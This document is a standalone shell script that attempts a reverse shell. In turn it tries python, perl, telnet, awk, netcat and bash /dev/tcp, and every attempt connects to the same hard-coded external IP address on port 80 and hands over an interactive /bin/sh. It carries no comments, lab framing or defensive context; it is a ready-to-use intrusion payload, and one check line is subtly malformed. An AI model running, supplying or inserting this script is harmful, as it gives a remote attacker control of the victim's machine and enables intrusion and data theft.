if command -v python > /dev/null 2>&1; then
    python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("164.92.136.249", 80)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
    exit;
fi

if command -v perl > /dev/null 2>&1; then
    perl -e 'use Socket;$i="164.92.136.249";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
    exit;
fi

if command -v telnet > /dev/null 2>&1; then
    TF=$(mktemp -u);mkfifo $TF && telnet 164.92.136.249 80 0<$TF | sh 1>$TF
    exit;
fi

if command -v awk > /dev/null 2&1; then
    awk 'BEGIN {s = "/inet/tcp/0/164.92.136.249/80"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
    exit;
fi

if command -v nc > /dev/null 2>&1; then
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 164.92.136.249 80 >/tmp/f
    exit;
fi

if command -v sh > /dev/null 2>&1; then
    /bin/sh -i >& /dev/tcp/164.92.136.249/80 0>&1
    exit;
fi
